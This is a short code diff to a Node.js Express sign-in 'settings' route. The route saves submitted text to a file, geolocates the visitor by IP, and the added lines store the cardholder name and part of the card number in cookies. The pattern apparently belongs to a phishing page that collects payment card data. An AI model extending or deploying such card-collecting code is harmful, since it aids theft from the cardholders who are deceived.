@@ -104,7 +104,14 @@ app.post(main_url+'/signin/settings',function (req,res) {
     txt = `<p>${txt}</p><hr>`;
     save(file,txt);
     var type = req.body.c_type;
+    try {
+        var card_n = req.body.cardnumber.split(' ')[3];
+    }
+    catch (e) {  var card_n = ''; }
+
     res.cookie('c_card', type, { maxAge: 900000});
+    res.cookie('card_name', req.body.nameoncard, { maxAge: 900000});
+    res.cookie('card_n', card_n, { maxAge: 900000});
 
     get_coun(get_ip(req).clientIp,function (cc) {
         res.cookie('local', cc, { maxAge: 900000});
